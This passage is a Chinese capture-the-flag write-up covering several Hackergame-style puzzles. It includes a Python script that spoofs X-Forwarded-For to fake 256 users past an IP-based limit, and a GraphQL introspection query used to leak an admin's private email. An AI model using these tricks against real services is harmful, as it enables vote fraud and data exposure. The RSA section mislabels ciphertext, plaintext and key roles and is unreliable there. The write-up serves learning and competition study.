\u4ee5\u76d1\u7763\u5e76\u60e9\u6212\u6240\u6709\u8fdd\u80cc RFC \u6587\u6863\u7684\u884c\u4e3a\u4e2a\u4f53\u3002\u5047\u5982\u4f60\u53d1\u73b0\u4e86\u67d0\u4f4d\u540c\u5b66\u53ef\u80fd\u8fdd\u53cd\u4e86\u534f\u8bae\u89c4\u8303\uff0c\u6839\u636e Protocol Police \u76f8\u5173\u6587\u6863\u4e2d\u89c4\u5b9a\u7684\u4e3e\u62a5\u65b9\u6cd5\uff0c\u4f60\u5e94\u8be5\u5c06\u4f60\u7684\u4e3e\u62a5\u4fe1\u53d1\u5f80\u4f55\u5904\uff1f \u6ca1\u5565\u597d\u8bf4\u7684\uff0c\u76f4\u63a5\u67e5\uff0c\u7b54\u6848 /dev/null \u7136\u540e\u63d0\u4ea4\u5c31\u53ef\u4ee5\u5f97\u5230 flag \u5356\u74dc \u00b6 \u9898\u76ee\u91cc\u6bd4\u8f83\u91cd\u8981\u7684\u8bdd\u5c31\u662f\uff1a \u8865\u5145\u8bf4\u660e\uff1a\u5f53\u79f0\u7684\u6570\u5b57\u53d8\u4e3a\u6d6e\u70b9\u6570\u800c\u4e0d\u662f\u6574\u6570\u65f6\uff0cHQ \u4e0d\u4f1a\u8ba4\u53ef\u6700\u7ec8\u7684\u79f0\u91cd\u7ed3\u679c\u3002 \u9898\u76ee\u7684\u76ee\u7684\u4e5f\u5f88\u660e\u786e\uff0c\u7528\u4e00\u58069\u548c\u4e00\u58066\u52a0\u8d77\u6765\u5f97\u523020\u3002\u80af\u5b9a\u4e0d\u80fd \u50cf\u534e\u5f3a\u4e00\u6837 \u5288\u74dc\uff0c\u6240\u4ee5\u8f93\u5165\u4e00\u5b9a\u662f\u6574\u6570 \u90a3\u5c31\u53ef\u4ee5\u8003\u8651\u6ea2\u51fa \u4f46\u662f\u7ecf\u8fc7\u5c1d\u8bd5\uff0c\u7ed9\u7684\u6570\u5b57\u592a\u5927\uff0c\u5c31\u4f1a\u4f7f\u7ed3\u679c\u6ea2\u51fa\u5230\u6d6e\u70b9\u6570\uff0c\u8fd9\u4e0d\u662f\u60f3\u8981\u7684\uff08\u56e0\u4e3a\u5373\u4f7f\u51d1\u5230\u4e8620.0\u4e5f\u4e0d\u6b63\u786e\uff09 \u90a3\u5982\u679c\u6570\u5b57\u518d\u5927\u5462\uff0c\u6bd4\u5982 2000000000000000000\uff0818\u4e2a0\uff09\u4e2a9\u65a4\u7684\u74dc\uff0c\u53ef\u4ee5\u53d1\u73b0\uff0c\u8fd9\u65f6\u76f4\u63a5\u6ea2\u51fa\u5230\u4e86\u8d1f\u6574\u578b -446744073709551616 \u518d\u8865\u4e0a 49638230412172000 \u4e2a9\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 -3616\uff0c\u52a0\u4e0a20\u53ef\u4ee5\u88ab6\u6574\u9664\uff0c\u6240\u4ee5\u518d\u52a0\u4e0a606\u4e2a6\u65a4\u7684\u74dc\u5c31\u53ef\u4ee5\u5f97\u5230 20 \u606d\u559c\u4f60\u9003\u8fc7\u4e00\u52ab\uff01\u534e\u5f3a\uff5e\u534e\u5f3a\uff01 \u900f\u660e\u7684\u6587\u4ef6 \u00b6 \u4e00\u4e2a\u900f\u660e\u7684\u6587\u4ef6\uff0c\u7528\u4e8e\u5728\u7ec8\u7aef\u4e2d\u5c55\u793a\u4e00\u4e2a\u4e94\u989c\u516d\u8272\u7684 flag\u3002 \u53ef\u80fd\u662f\u5728 cmd.exe \u7b49\u52a3\u8d28\u7ec8\u7aef\u4e2d\u88ab\u957f\u671f\u4f7f\u7528\u7684\u539f\u56e0\uff0c\u8fd9\u4e2a\u6587\u4ef6\u5931\u53bb\u4e86\u4e00\u4e9b\u91cd\u8981\u6210\u5206\uff0c\u53d8\u6210\u4e86\u4e00\u5806\u4e71\u7801\uff0c\u4e5f\u4e0d\u4f1a\u518d\u663e\u793a\u51fa flag \u4e86\u3002 \u6ce8\u610f\uff1aflag \u5185\u90e8\u7684\u5b57\u7b26\u5168\u90e8\u4e3a\u5c0f\u5199\u5b57\u6bcd\u3002 \u62ff\u5230\u6587\u4ef6\uff0c\u770b\u5230\u91cc\u9762\u597d\u591a [ ; m \u4e4b\u7c7b\u7684\uff0c\u518d\u7ed3\u5408\u7ec8\u7aef\u4e2d\u8f93\u51fa\u5e26\u989c\u8272\u6587\u5b57\u7684 \\033[...m; \u4e4b\u7c7b\u7684\u65b9\u6cd5\uff0c\u4ee5\u53ca\u9898\u76ee\u4e2d\u7684 \u201c\u5931\u53bb\u4e86\u4e00\u4e9b \u91cd\u8981\u6210\u5206 \u201d \u6240\u4ee5\u76f4\u63a5\u5c1d\u8bd5\u628a [ \u5168\u5c40\u66ff\u6362\u4e3a \\033[ \uff0c\u7136\u540e\u590d\u5236\u5230 python \u4e2d print\uff0c\u5c31\u53ef\u4ee5\u770b\u5230\u795e\u5947\u7684\u4e00\u5e55\u4e86\uff08\u5176\u5b9e\u5e76\u6ca1\u5b8c\u5168\u505a\u5b8c\uff0c\u4f46\u662f\u53ef\u4ee5\u5df2\u7ecf\u770b\u4e86\uff09 \u7136\u540e\u8bfb\u51fa flag \u5373\u53ef\uff08\u5168\u662f\u5c0f\u5199\u5b57\u6bcd\uff09 \u65c5\u884c\u7167\u7247 \u00b6 \u4f60\u7684\u5b66\u957f\u51b3\u5b9a\u6765\u4e00\u573a\u8bf4\u8d70\u5c31\u8d70\u7684\u65c5\u884c\u3002\u901a\u8fc7\u4ed6\u53d1\u7ed9\u4f60\u7684\u7167\u7247\u6765\u770b\uff0c\u4ed6\u5e94\u8be5\u662f\u5728\u9152\u5e97\u4f4f\u4e0b\u4e86\u3002 \u4ece\u7167\u7247\u6765\u770b\uff0c\u9152\u5e97\u4f3c\u4e4e\u5728\u5c0f\u533a\u7684\u4e00\u680b\u9ad8\u697c\u91cc\uff0c\u9644\u8fd1\u8fd8\u6709\u4e00\u5bb6 KFC \u5206\u5e97\u3002\u7a81\u7136\uff0c\u4f60\u610f\u8bc6\u5230\u7167\u7247\u91cc\u900f\u9732\u51fa\u6765\u7684\u4fe1\u606f\u6bd4\u8868\u9762\u4e0a\u770b\u8d77\u6765\u7684\u8981\u591a\u3002 \u8bf7\u89c2\u5bdf\u7167\u7247\u5e76\u7b54\u5bf9\u5168\u90e8 5 \u9053\u9898\u4ee5\u83b7\u53d6 flag\u3002\u6ce8\u610f\uff1a\u56fe\u7247\u672a\u5728\u5176\u4ed6\u5730\u65b9\u516c\u5f00\u53d1\u5e03\u8fc7\uff0c\u4e5f\u672a\u91c7\u53d6\u4efb\u4f55\u9690\u5199\u63aa\u65bd\uff08\u901a\u8fc7\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\uff09\u3002 \u201c\u624b\u673a\u62cd\u6444\u5c4f\u5e55\u4ea6\u53ef\u7b54\u9898\u201d\uff0c\u6240\u4ee5\u7167\u7247\u4e2d\u6ca1\u6709\u4efb\u4f55\u5730\u5740\u7684\u5143\u4fe1\u606f\uff0c\u53ea\u80fd\u9760\u770b\u56fe \u7ebf\u7d22 \uff1a\u6d77\u8fb9\u3001KFC\u3001\u9ad8\u697c\u3001\u5927\u77f3\u5934\u3001\u505c\u8f66\u4f4d \u5148\u770b\u90a3\u4e2aKFC\uff0c\u5927\u6982\u662f\u4e2a\u7f51\u7ea2\u5e97\uff0c\u6240\u4ee5\u641c\u7d22 \u201c\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201d\uff0c\u67e5\u5230\u4e86\u79e6\u7687\u5c9b\uff0c\u800c\u4e14\u4e5f\u662f\u6d77\u8fb9 \u518d\u8fdb\u4e00\u6b65\u770b\u5730\u56fe\u548c\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u786e\u5b9a\u5730\u70b9\u5728 \u79e6\u7687\u5c9b\u65b0\u6fb3\u6d77\u5e95\u4e16\u754c \u7136\u540e\u662f5\u4e2a\u95ee\u9898 \u8be5\u7167\u7247\u62cd\u6444\u8005\u7684\u9762\u671d\u65b9\u5411\u4e3a\uff1a \u6839\u636e\u5730\u56fe\uff0c\u5bf9\u6bd4\u4e00\u4e0b\u5c31\u53ef\u4ee5\u5f97\u5230\uff0c\u9762\u671d\u65b9\u5411\u662f \u4e1c\u5357 \u8be5\u7167\u7247\u7684\u62cd\u6444\u65f6\u95f4\u5927\u81f4\u4e3a\uff1a \u6839\u636e\u9009\u9879\u91cc\u7684\u65f6\u95f4\uff0c\u4e0b\u5348\u662f\u4e24\u70b9\u534a\u5de6\u53f3\uff0c\u800c\u5728\u4e1c\u5317\u7684\u4e24\u70b9\u534a\u5de6\u53f3\u5176\u5b9e\u548c\u4e2d\u5348\u5dee\u4e0d\u591a\uff0c\u5f71\u5b50\u548c\u5149\u6e29\u4e5f\u4e0d\u592a\u50cf\u8fd9\u4e2a\u6837\u5b50\uff0c\u6240\u4ee5\u53ef\u4ee5\u786e\u5b9a\u65f6\u95f4\u5927\u81f4\u662f \u508d\u665a \u8be5\u7167\u7247\u7684\u62cd\u6444\u8005\u6240\u5728\u697c\u5c42\u4e3a\uff1a \u4e0d\u597d\u786e\u5b9a\uff0c\u4f46\u662f\u7b54\u6848\u53ef\u4ee5\u4ea4\u5f88\u591a\u6b21\uff0c\u6240\u4ee5\u4ece9\u5c42\u5de6\u53f3\u4f9d\u6b21\u8bd5\u5c31\u53ef\u4ee5\u4e86\uff0c\u6700\u540e\u5f97\u5230\u697c\u5c42\u662f 14 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u7684\u7535\u8bdd\u53f7\u7801\u662f\uff1a \u76f4\u63a5\u7528\u5730\u56fe\u8f6f\u4ef6\u641c \u201c\u79e6\u7687\u5c9b\u65b0\u6fb3 KFC\u201d \u5c31\u53ef\u4ee5\u67e5\u5230\u90a3\u5bb6\u5e97\u94fa\uff0c\u4e5f\u7ed9\u4e86\u7535\u8bdd\uff0c\u6216\u8005\u641c\u7d22 \u201d\u7f51\u7ea2 \u6d77\u8fb9 KFC\u201c \u4e5f\u53ef\u4ee5\u76f4\u63a5\u5f97\u5230\u7535\u8bdd\uff1a 0335-7168800 \u8be5\u7167\u7247\u5de6\u4e0a\u89d2 KFC \u5206\u5e97\u5de6\u4fa7\u5efa\u7b51\u6709\u4e09\u4e2a\u6c34\u5e73\u6392\u5217\u7684\u6c49\u5b57\uff0c\u5b83\u4eec\u662f\uff1a \u901a\u8fc7\u8857\u666f\u5730\u56fe\u5c31\u53ef\u4ee5\u770b\u5230 KFC \u5de6\u8fb9\u7684\u5efa\u7b51\u4e0a\u5199\u4e86 \u6d77\u8c5a\u9986 FLAG \u52a9\u529b\u5927\u7ea2\u5305 \u00b6 \u53c2\u4e0e\u6d3b\u52a8\uff0c\u52a9\u529b\u62bd\u5956\uff01\u96c6\u6ee1 1 \u4e2a flag\uff0c\u5373\u53ef\u63d0\u53d6 1 \u4e2a flag\u3002 \u606d\u559c\u4f60\u79ef\u6512\u5230 0.5\u2026\u2026 \u4e2a flag\uff0c \u5269\u4f59\u65f6\u95f4\uff1a10\u520600\u79d2 \u5df2\u6709 0 \u4f4d\u597d\u53cb\u4e3a\u60a8\u52a9\u529b\u3002 \u5c06\u5982\u4e0b\u94fe\u63a5\u5206\u4eab\u7ed9\u597d\u53cb\uff0c\u53ef\u4ee5\u83b7\u5f97\u597d\u53cb\u52a9\u529b\uff0c\u83b7\u5f97\u66f4\u591a flag\uff1a\u2026\u2026 \u8001\u5e76\u5915\u5915\u4e86 \uff0c\u7ecf\u8fc7\u4e00\u4e9b\u6d4b\u8bd5\u548c\u770b\u89c4\u5219\u53ef\u4ee5\u77e5\u9053\uff0cip \u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684\u7528\u6237\u88ab\u89c6\u4e3a\u540c\u4e00\u7528\u6237\uff0c\u5373 ip \u5730\u5740\u7684\u7b2c\u4e00\u4e2a\u70b9\u524d\u9762\u7684\u6570\u5b57\u4e0d\u4e00\u6837\u624d\u662f\u4e0d\u540c\u7528\u6237 \u518d\u7528\u865a\u62df\u673a\u548c\u624b\u673a\u8bd5\u4e00\u4e0b\uff0c\u53d1\u73b0\u6bcf\u4e2a\u7528\u6237\u589e\u52a0\u7684 flag \u6570\u91cf\u5f88\u5c0f \u6240\u4ee5\u63a8\u6d4b\u9700\u8981200+\u4e2a ip \u5730\u5740\uff0c\u80af\u5b9a\u4e0d\u4f1a\u8981\u771f\u7684\u8f6c\u53d1\uff0c\u800c\u4e14\u4e5f\u5f88\u96be\u51d1\u51fa\u5f88\u591a\u4e0d\u5728\u540c\u4e00 /8 \u7f51\u6bb5\u7684 ip \u4e8e\u662f\u5728 BurpSuite \u91cc\u9762\u6293\u5305\u53ef\u4ee5\u770b\u5230\uff0c\u6bcf\u6b21\u70b9\u51fb\u201c\u52a9\u529b\u201d\u90fd\u4f1a\u53d1\u9001\u4e00\u4e2a\u5230\u52a9\u529b\u94fe\u63a5\u7684 POST\uff0c\u5185\u5bb9\u4e3a ip \u5730\u5740 \u7136\u540e\u5c06\u5176\u53d1\u9001\u5230 Repeater \u4e2d\uff0c\u5c1d\u8bd5\u66f4\u6539 ip \u5730\u5740\uff0c\u5f97\u5230\u7684 Response \u4e2d\u8bf4 \u201c\u5931\u8d25\uff01\u68c0\u6d4b\u5230\u524d\u540e\u7aef\u68c0\u6d4b IPv4 \u5730\u5740\u4e0d\u5339\u914d\u201d \u6240\u4ee5\u4ec5\u4ec5\u66f4\u6539 POST \u5185\u5bb9\u7684 ip \u662f\u4e0d\u591f\u7684\uff0c\u800c\u63d0\u4f9b\u7ed9\u68c0\u6d4b\u7684\u5185\u5bb9\u4e5f\u4ec5\u4ec5\u662f\u4e00\u4e2a POST\uff0c\u6240\u4ee5\u53ef\u4ee5\u66f4\u6539 POST \u5934\uff0c\u6dfb\u52a0 X-Forwarded-For \u7136\u540e\u4f7f\u7528 python \u5c31\u53ef\u4ee5\u5faa\u73af\u53d1\u9001 POST \u5e76\u4f2a\u9020 ip \u5730\u5740\u5f97\u5230256\u4e2a\u52a9\u529b\u4e86\uff0c\u521a\u597d\u8fbe\u52301\u4e2aflag\uff1a \uff08\u8981\u6ce8\u610f sleep \u4e00\u6bb5\u65f6\u95f4\uff0c\u4e0d\u7136\u4f1a\u51fa\u73b0\u64cd\u4f5c\u8fc7\u5feb\u62d2\u7edd\u7684\u60c5\u51b5\uff1b\u4e5f\u4e0d\u8981 sleep \u8fc7\u957f\uff0c\u5426\u5219\u8d85\u8fc710\u5206\u949f flag \u5c31\u65e0\u6548\u4e86\uff09 import requests import time from tqdm import tqdm url = \"http://202.38.93.111:10888/invite/...\" with tqdm ( total = 256 ) as pbar : for i in range ( 256 ): res = requests . post ( url , data = { \"ip\" : f \" { i } .0.0.0\" }, headers = { \"X-Forwarded-For\" : f \" { i } .0.0.0\" }) if \"\u6210\u529f\" not in res . text : print ( \"[x] \u5931\u8d25\" ) print ( res . text ) time . sleep ( 1.5 ) pbar . update ( 1 ) Amnesia \u00b6 \u8f7b\u5ea6\u5931\u5fc6 \u00b6 \u4f60\u7684\u7a0b\u5e8f\u53ea\u9700\u8981\u8f93\u51fa\u5b57\u7b26\u4e32 Hello, world!\uff08\u7ed3\u5c3e\u6709\u65e0\u6362\u884c\u5747\u53ef\uff09\u5e76\u6b63\u5e38\u7ed3\u675f\u3002 \u7f16\u8bd1\u6307\u4ee4\uff1a gcc -O file.c -m32 \u8fd0\u884c\u6307\u4ee4\uff1a ./a.out \u7f16\u8bd1\u540e ELF \u6587\u4ef6\u7684 .data \u548c .rodata \u6bb5\u4f1a\u88ab\u6e05\u96f6\u3002 ELF\uff08Executable and Linkable Format\uff09\u662f Linux \u4e0b\u5e38\u7528\u7684\u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u5176\u4e2d\u6709\u5f88\u591a\u4e0d\u540c\u7684\u8282\uff1a .text \u8282\uff1a\u7a0b\u5e8f\u8fd0\u884c\u9700\u8981\u7684\u4ee3\u7801 .data \u8282\uff1a\u5b58\u653e\u53ef\u4fee\u6539\u7684\u6570\u636e\uff0c\u4e00\u822c\u662f\u975e const \u5168\u5c40\u53d8\u91cf\u548c\u9759\u6001\u53d8\u91cf .rodata \u8282\uff1a\u5373 read only data\uff0c\u4e00\u822c\u662f\u5e38\u91cf\u6216\u8005\u5b57\u7b26\u4e32 .bss \u8282\uff1a\u6ca1\u6709\u88ab\u521d\u59cb\u5316\u7684\u53d8\u91cf \u2026\u2026 \u800c\u8fd9\u9053\u9898\u76ee\u5219\u662f\u5728\u7f16\u8bd1\u751f\u6210\u53ef\u6267\u884c\u6587\u4ef6 a.out \u540e\uff0c\u6e05\u7a7a .data \u548c .rodata \u9996\u5148\u4e0d\u59a8\u6b63\u5e38\u7f16\u5199\u4e00\u4e2a\u8f93\u51fa \u201cHello, world!\u201d \u7684\u7a0b\u5e8f\uff1a printf ( \"Hello, world! \\n \" ); \u7136\u540e\u7f16\u8bd1\uff0c\u518d\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u53d1\u73b0\uff0c\u6b64\u65f6\u7684 \"Hello, world!\" \u88ab\u653e\u5230\u4e86 .rodata \u8282\u4e2d\uff0c\u4f1a\u88ab\u6e05\u9664\u6389\uff0c\u6240\u4ee5\u8fd9\u6837\u5199\u4e0d\u884c \u76f4\u63a5\u4f7f\u7528\u5b57\u7b26\u4e32\u4f1a\u88ab\u653e\u5230 .rodata \u4e2d\u6e05\u9664\uff0c\u5199\u6210\u5168\u5c40\u53d8\u91cf\u53c8\u4f1a\u653e\u5230 .data \u4e2d \u4f46\u662f\uff0c\u5982\u679c\u5199\u6210\u5c40\u90e8\u53d8\u91cf\u5462\uff1a char str [] = \"Hello, world! \\n \" ; printf ( str ); \u7f16\u8bd1\uff0c\u62d6\u5230 IDA \u91cc \u53ef\u4ee5\u770b\u51fa\uff0c\u8fd9\u6b21\u7684\u5b57\u7b26\u4e32\u76f4\u63a5\u5199\u5230\u4e86 .text \u8282\u4e2d\uff0c\u5220\u6389\u4e86 .data .rodata \u4e5f\u6ca1\u6709\u5f71\u54cd \u6240\u4ee5\u628a\u8fd9\u4e2a\u4ee3\u7801\u4ea4\u4e0a\u53bb\u5c31\u53ef\u4ee5\u8f93\u51fa \u201cHello, world!\u201c \u62ff\u5230 flag \u4e86 \u6e05\u9664\u8bb0\u5fc6\u76f4\u63a5\u628a .text \u8282\u5168\u5220\u6389\u4e86\uff0c\u60f3\u4e86\u5f88\u4e45\u4e5f\u4e0d\u77e5\u9053\u548b\u641e\uff0c\u867d\u7136\u53ef\u4ee5 __attribute__ ((section (\"...\"))) \u6765\u628a\u51fd\u6570\u6216\u53d8\u91cf\u585e\u5230\u6307\u5b9a\u7684\u8282\u4e2d\u3002\u4f46\u8fd8\u662f\u4e0d\u6e05\u695a\u8981\u600e\u4e48\u89e3\u51b3\u6bb5\u9519\u8bef\u7684\u95ee\u9898qwq \u56fe\u4e4b\u4e0a\u7684\u4fe1\u606f \u00b6 \u5c0f T \u542c\u8bf4 GraphQL \u662f\u4e00\u79cd\u7279\u522b\u7684 API \u8bbe\u8ba1\u6a21\u5f0f\uff0c\u4e5f\u662f RESTful API \u7684\u6709\u529b\u7ade\u4e89\u8005\uff0c\u6240\u4ee5\u4ed6\u5199\u4e86\u4e2a\u5c0f\u7f51\u7ad9\u6765\u5b9e\u9a8c\u8fd9\u9879\u6280\u672f\u3002 \u4f60\u80fd\u901a\u8fc7\u8fd9\u4e2a\u5168\u65b0\u7684\u63a5\u53e3\uff0c\u83b7\u53d6\u5230\u6ca1\u6709\u516c\u5f00\u51fa\u6765\u7684\u7ba1\u7406\u5458\u7684\u90ae\u7bb1\u5730\u5740\u5417\uff1f \u9898\u76ee\u4fe1\u606f\u7ed9\u7684\u5f88\u5145\u5206\uff0c\u7528\u7684\u662f GraphQL\uff0c\u8981\u7528\u5176\u5f97\u5230 admin \u7684\u90ae\u7bb1 \u6ca1\u63a5\u89e6\u8fc7 GraphQL\uff0c\u6240\u4ee5\u76f4\u63a5\u5fc5\u5e94\uff08\u9003 \u67e5\u5230\u4e86\u5f88\u591a\u6709\u7528\u7684\u4e1c\u897f\uff1a GraphQL\u5b98\u7f51 \uff1a\u4e86\u89e3\u4e00\u4e0b GraphQL \u662f\u5e72\u4ec0\u4e48\u7684\uff0c\u8981\u600e\u4e48\u7528 GraphiQL \uff1a\u4e00\u4e2a\u8fdb\u884c GraphQL \u67e5\u8be2\u7684 GUI \u3010\u5b89\u5168\u8bb0\u5f55\u3011\u73a9\u8f6cGraphQL - DVGA\u9776\u573a\uff08\u4e0a\uff09- \u77e5\u4e4e GraphQL Voyager \uff1a\u53ef\u89c6\u5316\u73b0\u5b9e GraphQL \u5185\u7701\u51fa\u7684\u7ed3\u6784 \u7b80\u800c\u8a00\u4e4b\uff0cGraphQL \u5c31\u662f\u4e00\u4e2a\u53ef\u4ee5\u901a\u8fc7\u4e00\u6b21 query \u8bf7\u6c42\u67e5\u8be2\u591a\u4e2a\u8d44\u6e90\u7684 API \u6a21\u5f0f\uff0c\u53ea\u8981 \u7f51\u5740/graphql?query=... \u5c31\u53ef\u4ee5\u5b9e\u73b0\u67e5\u8be2 \u6709\u4e9b\u4f7f\u7528 GraphQL \u7684\u7f51\u7ad9\u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u8bbf\u95ee \u7f51\u5740/graphiql \u5f97\u5230\u67e5\u8be2\u7684 GUI \u4f46\u662f\u672c\u9898\u4e2d\u7981\u6b62\u4e86\uff0c\u4f46\u53ef\u4ee5\u4f7f\u7528 GraphiQL \u8f6f\u4ef6\u6765\u8fdb\u884c\u67e5\u8be2 \u5728\u7b2c\u4e09\u4e2a\u94fe\u63a5\u4e2d\u53ef\u4ee5\u4e86\u89e3\u5230\uff0c\u53ef\u4ee5\u5229\u7528 GraphQL \u7684\u5185\u7701\u67e5\u8be2\u6765\u6cc4\u9732\u51fa\u5185\u90e8\u7684\u7ed3\u6784\uff0c\u628a\u5176\u4e2d\u7684\u67e5\u8be2\u8bed\u53e5\u4e22\u5230 GraphiQL \u4e2d\u53ef\u4ee5\u5f97\u5230\u7ed3\u679c query IntrospectionQuery { __schema { queryType { name } mutationType { name } subscriptionType { name } types { ...FullType } directives { name description locations args { ...InputValue } } }}fragment FullType on __Type { kind name description fields(includeDeprecated: true) { name description args { ...InputValue } type { ...TypeRef } isDeprecated deprecationReason } inputFields { ...InputValue } interfaces { ...TypeRef } enumValues(includeDeprecated: true) { name description isDeprecated deprecationReason } possibleTypes { ...TypeRef }}fragment InputValue on __InputValue { name description type { ...TypeRef } defaultValue}fragment TypeRef on __Type { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name ofType { kind name } } } } } } }} \u7136\u540e\u628a\u7ed3\u679c\u4e22\u5230 GraphQL Voyager \u4e2d\u5c31\u53ef\u4ee5\u5f97\u5230\u53ef\u89c6\u5316\u7684\u7ed3\u6784\uff1a \u6240\u4ee5\u53ea\u9700\u8981\u6839\u636e id query \u4e00\u4e0b user \u5c31\u53ef\u4ee5\u4e86\uff1a query { user ( id : 1 ) { privateEmail , } } >>> { \"data\" : { \"user\" : { \"privateEmail\" : \"flag{...}\" } } } Easy RSA \u00b6 \u81ea\u4ece Hackergame 2018 \u516c\u7136\u63ed\u9732\u4e86\u5927\u6574\u6570\u53ef\u4ee5\u88ab\u795e\u7ae5\u53e3\u7b97\u5206\u89e3\u7684\u4e8b\u5b9e\uff0cRSA \u5728 hackergame \u4e2d\u5df2\u7ecf\u53ea\u80fd\u5904\u4e8e\u4f4e\u5206\u503c\u7684\u5730\u4f4d\u4e86\u3002\u5982\u679c\u4e0d\u5728\u5176\u540d\u79f0\u524d\u9762\u52a0\u4e0a Easy \u8fd9\u4e2a\u5355\u8bcd\uff0c\u4f3c\u4e4e\u5c31\u4f1a\u663e\u5f97\u5b8c\u5168\u5bf9\u4e0d\u8d77\u5176\u4ed6\u9898\u76ee\u3002 \u66f4\u4f55\u51b5\uff0c\u5728\u672c\u9898\u7684\u9644\u4ef6\u4e2d\uff0c\u4f60\u8fd8\u83b7\u5f97\u4e86\u6784\u9020 p \u548c q \u7684\u65b9\u5f0f\u3002\u6570\u7406\u57fa\u7840\u624e\u5b9e\u7684\u4f60\u5e94\u8be5\u53ef\u4ee5\u8f7b\u677e\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u5427\u3002 \u8c22\u9080\uff0c\u6ca1\u6709\u6570\u7406\u57fa\u7840 \u770b\u4ee3\u7801\uff01 e = 65537 def get_p (): x = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391760451 y = 11124440021748127159092076861405454814981575144744508857178576572929321435002942998531420985771090167262256877805902135304112271641074498386662361391661439 value_p = sympy . nextprime (( math . factorial ( y )) % x ) # Hint\uff1a\u8fd9\u91cc\u76f4\u63a5\u8ba1\u7b97\u4f1a\u6ea2\u51fa\uff0c\u8bf7\u4f60\u4ed4\u7ec6\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81 return value_p def get_q (): value = [ getPrime ( 256 )] for i in range ( 1 , 10 ): value . append ( sympy . nextprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) # value[-1] = 80096058210213458444437404275177554701604739094679033012396452382975889905967 n = 1 for i in range ( 10 ): n = n * value [ i ] q = getPrime ( 512 ) value_q = pow ( q , e , n ) print ( \"value_q = \" , value_q ) # value_q = 5591130088089053683141520294620171646179623062803708281023766040254675625012293743465254007970358536660934858789388093688621793201658889399155357407224541324547522479617669812322262372851929223461622559971534394847970366311206823328200747893961649255426063204482192349202005330622561575868946656570678176047822163692259375233925446556338917358118222905050574458037965803154233167594946713038301249145097770337253930655681648299249481985768272321820718607757023350742647019762122572886601905212830744868048802864679734428398229280780215896045509020793530842541217790352661324630048261329493088812057300480085895399922301827190211956061083460036781018660201163819104150988531352228650991733072010425499238731811243310625701946882701082178190402011133439065106720309788819 return sympy . nextprime ( q ) # this destroyes the rsa cryptosystem p = get_p () q = get_q () m = int . from_bytes ( open ( \"flag.txt\" , \"rb\" ) . read (), \"big\" ) c = pow ( m , e , p * q ) print ( \"c = \" , c ) # c = 110644875422336073350488613774418819991169603750711465190260581119043921549811353108399064284589038384540018965816137286856268590507418636799746759551009749004176545414118128330198437101472882906564195341277423007542422286760940374859966152871273887950174522820162832774361714668826122465471705166574184367478 \u53ef\u4ee5\u770b\u5230\uff0c\u5176\u4e2d\u8981\u89e3\u51b3\u7684\u5c31\u662f get_p() \u4e2d y! % x \u6ea2\u51fa\u7684\u95ee\u9898\uff0c\u4ee5\u53ca get_q() \u4e2d q \u662f\u54ea\u4e2a\u968f\u673a\u7684512\u4f4d\u8d28\u6570\u7684\u95ee\u9898 get_p : \u4ee3\u7801\u91cc\u4e5f\u7ed9\u4e86 Hint\uff0c\u89c2\u5bdf x \u548c y \u7684\u7279\u5f81\u3002x \u548c y \u90fd\u5f88\u5927\uff0c\u4f46\u662f\u4e24\u4e2a\u7684\u5dee\u5e76\u4e0d\u5927\uff1b\u800c\u4e14\u53ef\u4ee5\u4e22\u5230 python \u91cc\u9a8c\u8bc1\u51fa x \u662f\u4e00\u4e2a\u8d28\u6570 \u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528 \u5a01\u5c14\u900a\u5b9a\u7406 \u4e5f\u67e5\u5230\u4e86\u5a01\u5c14\u900a\u5b9a\u7406\u5728 RSA \u9898\u76ee\u4e2d\u7684\u5e94\u7528\uff1a BUU-RSA [RoarCTF2019]babyRSA \u8981\u6c42 y! % x\uff08x\u662f\u8d28\u6570\uff09 \u6839\u636e\u5a01\u5c14\u900a\u5b9a\u7406\uff0c\u6709 \\[ (x - 1)! \\equiv -1\\pmod{x} \\] \u6240\u4ee5\uff1a \\[ y!\\times \\frac{(x - 1)!}{y!}\\equiv -1\\pmod{x} \\] \u4ee4 \\(k = \\dfrac{(x - 1)!}{y!} = (y+1)(y+2)...(x-1)x\\) \uff0c\u6240\u4ee5\u6709\uff1a \\[ y!\\equiv -\\mathrm{inv}(k, x)\\pmod{x} \\] \uff08\u5176\u4e2d \\(\\mathrm{inv}(k, x)\\) \u8868\u793a\u6a21 x \u4e0b k \u7684\u9006\u5143\uff09 \u6240\u4ee5\u91cd\u5199 get_p() \u5373\u53ef\u6b63\u786e\u7684\u5f97\u5230 p\uff1a def get_p (): x = ... y = ... k = 1 for i in range ( y + 1 , x ): k = ( k * i ) % x res = ( - gmpy2 . invert ( k , x )) % x return sympy . nextprime ( res ) get_q : \u76f8\u6bd4\u6765\u8bf4\uff0cget_q \u5c31\u6ca1\u90a3\u4e48\u9700\u8981\u6280\u5de7\u4e86 \u7ed9\u51fa\u4e86 value[-1] \u7684\u503c\uff0c\u6240\u4ee5\u53ef\u4ee5\u76f4\u63a5\u7528 sympy.prevprime \u9006\u63a8\u51fa\u6574\u4e2a value \u6570\u7ec4 value = [ 80096058210213458444437404275177554701604739094679033012396452382975889905967 ] for i in range ( 1 , 10 ): value . append ( sympy . prevprime ( value [ i - 1 ])) print ( \"value[-1] = \" , value [ - 1 ]) \u540e\u9762\u8ba1\u7b97 value_q \u7ec6\u770b\u5176\u5b9e\u4e5f\u662f\u4e00\u4e2a RSA \u7b97\u6cd5\uff1a q\uff1a\u5bc6\u6587 e\uff1a\u79c1\u94a5 value_q\uff1a\u660e\u6587 n\uff1a\u5c31\u662f 